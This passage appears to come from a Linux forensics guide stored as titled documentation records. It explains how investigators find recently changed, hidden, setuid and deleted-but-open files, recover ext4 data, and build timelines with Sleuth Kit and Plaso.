find / -xdev -type f -newermt "2026-08-20 00:00" ! -newermt "2026-08-21 00:00" 2>/dev/null

# Files whose inode changed recently (ctime) — catches perms/owner/link changes and timestomps
find / -xdev -type f -cnewer /etc/hostname 2>/dev/null      # changed more recently than a reference file

# Suspicious locations first
find /tmp /var/tmp /dev/shm /run -type f 2>/dev/null | xargs ls -la --time-style=full-iso 2>/dev/null

-xdev keeps find on one filesystem (don't wander into /proc, /sys, network mounts). /dev/shm (RAM-backed) is a favourite drop spot because it vanishes on reboot and isn't "disk".

docs.title: Hidden & disguised files
docs.text:
# Dotfiles and dot-dir tricks (". " , ".. ", "..." names)
find / -xdev -name ".*" -type f 2>/dev/null | grep -vE "/(\.bashrc|\.profile|\.ssh|\.config)"
find / -xdev -name "* *" 2>/dev/null            # names with spaces
# setuid/setgid binaries (privilege persistence) — compare to a known-good baseline
find / -xdev -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la 2>/dev/null

# Files masquerading by extension vs actual type
file /tmp/*                                       # "PNG" that is really an ELF

Signals: an ELF binary named .systemd in /tmp; a setuid root binary that isn't part of any package (dpkg -S/rpm -qf returns nothing); a "log" file that file says is an executable; immutable files (lsattr shows i) an attacker set so you can't delete them (chattr -i to remove).

docs.title: Deleted-but-open files (live systems)
docs.text:
A process can hold a file open after it's unlinked from disk — malware deletes itself but keeps running:

# Files that are deleted but still held open by a running process
ls -l /proc/*/exe 2>/dev/null | grep -i deleted          # deleted binaries still executing
lsof +L1 2>/dev/null                                       # files with link count 0 (deleted, still open)
# Recover the content while the process lives:
cp /proc/<pid>/exe /evidence/recovered_binary
cat /proc/<pid>/maps                                       # memory-mapped files

/proc/<pid>/exe pointing at (deleted) is a strong indicator of self-deleting malware — you can still copy the live binary out of /proc for analysis.

docs.title: The ext4 journal & inode reuse
docs.text:
Ext4's journal ($journal, inode 8) records recent metadata transactions and can, with ext4magic/extundelete/debugfs, help recover recently deleted files or show prior inode states — the closest ext4 equivalent to reading the NTFS $LogFile. On xfs, xfs_db inspects metadata. These are image-level techniques:

# On a mounted-read-only image or raw device
debugfs -R "ls -d /tmp" /dev/sda1                          # deleted entries in a directory
ext4magic /dev/sda1 -a <start_epoch> -b <end_epoch> -j /dev/sda1   # recover in a time window
extundelete /dev/sda1 --restore-directory /home/user

docs.title: Building a Linux timeline
docs.text:
The Sleuth Kit / Plaso equivalent of the Windows super-timeline:

# Sleuth Kit: body file (MAC times per file) → mactime timeline
fls -r -m / /dev/sda1 > body.txt          # on an image; -m prefixes the mount point
mactime -b body.txt -d 2026-08-20 > timeline.csv

# Plaso covers Linux too (syslog, bash history, ext4, systemd, audit…)
log2timeline.py --parsers linux case.plaso /evidence/
psort.py -o l2tcsv -w timeline.csv case.plaso "date > '2026-08-20' AND date < '2026-08-21'"

See Plaso & timelines for filtering; the same "anchor on a known event, window ±1 hour" method applies.

docs.title: References
docs.text:
